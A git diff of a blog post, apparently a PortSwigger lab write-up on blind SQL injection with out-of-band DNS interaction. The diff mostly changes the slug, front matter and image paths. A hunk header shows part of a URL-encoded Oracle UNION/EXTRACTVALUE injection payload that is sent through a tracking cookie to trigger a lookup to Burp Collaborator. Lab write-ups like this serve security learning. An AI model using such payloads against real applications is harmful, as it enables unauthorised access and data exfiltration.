@@ -3,7 +3,7 @@ author: Nithissh S
 pubDatetime: 2024-09-11T15:22:00Z
 modDatetime: 2024-09-11T09:12:47.400Z
 title: Blind SQL injection with out-of-band interaction
-slug: sqli-portswigger-lab-14
+slug: sqli-portswigger-lab-15
 featured: false
 draft: false
 tags:
@@ -11,12 +11,6 @@ tags:
   - SQL Injection
 description:
   This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain. To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 
----
----
-layout: post
-title:  ""
-date:   2024-09-26 09:39:54 +0530
-categories: [BSCP, SQLi]
 ---
 
 ## Objective 
@@ -39,12 +33,12 @@ x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"
 
 Let's send the above payload through `TrackingId` parameter inside `Cookie` and when we send the request.. As it response with status code of `200` 
 
-![]({{ site.baseurl }}/assets/images/sqli54.png)
+![](../../assets/images/bscp/sqli/sqli54.png)
 
 Checking the Burp collaborator, we have recieved few DNS pingbacks 
 
-![]({{ site.baseurl }}/assets/images/sqli55.png)
+![](../../assets/images/bscp/sqli/sqli55.png)
 
 Our endgoal is acheived and lab is solved 
 
-![]({{ site.baseurl }}/assets/images/sqli56.png)
+![](../../assets/images/bscp/sqli/sqli56.png)
